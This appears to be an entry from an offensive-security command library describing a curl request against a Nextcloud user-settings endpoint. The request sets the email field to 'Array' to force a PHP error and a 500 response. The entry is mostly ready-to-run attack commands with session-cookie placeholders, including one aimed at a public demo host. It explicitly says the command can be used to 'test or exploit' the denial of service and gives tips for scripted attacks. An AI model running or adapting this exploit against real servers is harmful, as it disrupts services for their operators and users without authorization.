---
id: cmd-uuid-123
data: >-
  curl -X POST
  'https://target.nextcloud.com/index.php/settings/users/{user_id}/settings' -H
  'Cookie: nc_session_id=your_session_here' -H 'Content-Type:
  application/x-www-form-urlencoded' -d 'email=Array&timezone=America/New_York'
tags:
  - dos
  - web
  - curl
type: command
output: HTTP/1.1 500 Internal Server Error\n... (error details)
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.356Z'
verified: false
validated: true
submitted: true
---
# curl-nextcloud-dos

## Command

```bash
curl -X POST 'https://target.nextcloud.com/index.php/settings/users/{user_id}/settings' \
  -H 'Cookie: nc_session_id=your_session_here; other_cookies...' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=Array&timezone=America/New_York&other_required_fields=value'
```

## Description

This curl command simulates a malicious form submission to Nextcloud's user settings endpoint, setting the email parameter to 'Array' to trigger a PHP type mismatch error and 500 response. Use it to test or exploit the DoS vulnerability in authenticated sessions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST for form submission | Yes |
| `URL` | Target endpoint (replace with actual Nextcloud settings URL) | Yes |
| `-H 'Cookie: ...'` | Session cookies for authentication (capture from browser) | Yes |
| `-H 'Content-Type: ...'` | Sets form-encoded content type | Yes |
| `-d 'email=Array&...'` | Form data with malicious email value and other fields | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://demo.nextcloud.com/index.php/settings/users/TweLbFT93aqRnEfF/settings' \
  -H 'Cookie: nc_session_id=abc123' \
  -d 'email=Array'
```

### Advanced Usage

```bash
curl -X POST 'https://target.nextcloud.com/index.php/settings/users/{user_id}/settings' \
  -H 'Cookie: nc_session_id=abc123; nc_username=user' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=Array&timezone=UTC&language=en&other_field=value' \
  --max-time 10
```

Add `--max-time` for timeout control in scripted DoS attacks.

## Expected Output

A 500 Internal Server Error response, such as:

```
HTTP/1.1 500 Internal Server Error
Content-Type: text/html

<!DOCTYPE html>
<html><body><h1>Internal Server Error</h1>...</body></html>
```
Server logs may show PHP fatal error related to array handling in email processing.

## Related

- [[Related Procedure|procedures/Trigger-Nextcloud-DoS-via-Email-Field]]
